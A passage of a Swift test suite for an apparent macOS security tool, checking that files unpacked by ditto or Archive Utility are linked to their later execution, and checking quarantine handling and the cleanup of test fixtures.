        let tool = dittoOut + "/tool"; fm.createFile(atPath: tool, contents: Data("#!/bin/sh\necho com.rampart.test\n".utf8), attributes: [.posixPermissions: 0o755])
        let r2 = lin2.observe(SecurityEvent(date: t1.addingTimeInterval(5), kind: .exec, process: ProcessInfoLite(pid: 5200, ppid: 1, path: tool, args: [tool]), source: "test"))
        check(r2?.extraction.tool == "ditto" && lin2.evidence(for: r2!).score == 0, "cx: ditto extraction found via folder fallback; not downloaded = context only")
        check(lin2.scanOnExec(r2!, coordinator: coord) == nil, "cx: clean extracted tool produces no detection")
        let late = lin.observe(SecurityEvent(date: t0.addingTimeInterval(900), kind: .exec,
                                             process: ProcessInfoLite(pid: 4300, ppid: 1, path: "/bin/sh", args: ["sh", extracted]), source: "test"))
        check(late == nil, "cx: exec after the window is not linked")
        check(lin.observe(SecurityEvent(date: t0.addingTimeInterval(50), kind: .exec,
                                        process: ProcessInfoLite(pid: 4400, ppid: 1, path: "/usr/bin/true", args: ["true"]), source: "test")) == nil,
              "cx: unrelated exec not linked")
        let au = ProcessInfoLite(pid: 6100, ppid: 1, path: "/System/Library/CoreServices/Applications/Archive Utility.app/Contents/MacOS/Archive Utility",
                                 args: ["Archive Utility", outDir + "/b.zip"])
        let lin3 = ExtractionLineage(quarantineCheck: { _ in false })
        lin3.observe(SecurityEvent(date: t0, kind: .exec, process: au, source: "test"))
        lin3.observe(SecurityEvent(date: t0, kind: .fileCreate, process: au, path: outDir + "/b/x", source: "test"))
        let r3 = lin3.observe(SecurityEvent(date: t0.addingTimeInterval(3), kind: .exec, process: ProcessInfoLite(pid: 6200, ppid: 1, path: outDir + "/b/x"), source: "test"))
        check(r3?.extraction.tool == "Archive Utility" && r3?.extraction.dropsQuarantine == false, "cx: Archive Utility extraction tracked (propagates quarantine)")

        // MARK: 8. Fixture hygiene
        let after = Set((try? fm.contentsOfDirectory(atPath: unpackRoot)) ?? [])
        let leaked = after.subtracting(unpackBefore).filter { fm.fileExists(atPath: unpackRoot + "/" + $0) }
        check(leaked.isEmpty, "cx: no unpack/payload temp dirs left behind (\(leaked.count))")
        check(!unpackRoot.hasPrefix("/private/tmp/") && !unpackRoot.hasPrefix("/tmp/"), "cx: unpack temp root is not in /private/tmp (\(unpackRoot))")
        check(!fixtureTempDir.hasPrefix("/private/tmp/") && !fixtureTempDir.hasPrefix("/tmp/"), "cx: EICAR fixtures are not written under /private/tmp")
        try? fm.removeItem(atPath: work)
        check(!fm.fileExists(atPath: work), "cx: fixture dir removed")
    }

    /// Traditional uuencode (for fixtures).
    static func uuencode(_ d: Data, name: String) -> String {
        func c(_ v: UInt8) -> Character { Character(UnicodeScalar(v == 0 ? 96 : v + 32)) }
        var s = "begin 644 \(name)\n"
        let b = [UInt8](d)
        var i = 0
        while i < b.count {
            let line = Array(b[i..<min(b.count, i + 45)])
            s.append(c(UInt8(line.count)))
            var j = 0
            while j < line.count {
                let x = line[j], y = j + 1 < line.count ? line[j + 1] : 0, z = j + 2 < line.count ? line[j + 2] : 0
                s.append(c(x >> 2)); s.append(c((x << 4 | y >> 4) & 0x3F)); s.append(c((y << 2 | z >> 6) & 0x3F)); s.append(c(z & 0x3F))
                j += 3
            }
            s.append("\n"); i += 45
        }
        return s + "`\nend\n"
    }
}

/// Small read helper for checks.
enum ArchiveUnpackerTestHook {
    static func header(_ path: String) -> [UInt8] {
        guard let h = FileHandle(forReadingAtPath: path), let d = try? h.read(upToCount: 512) else { return [] }
        try? h.close(); return [UInt8](d)
    }
}
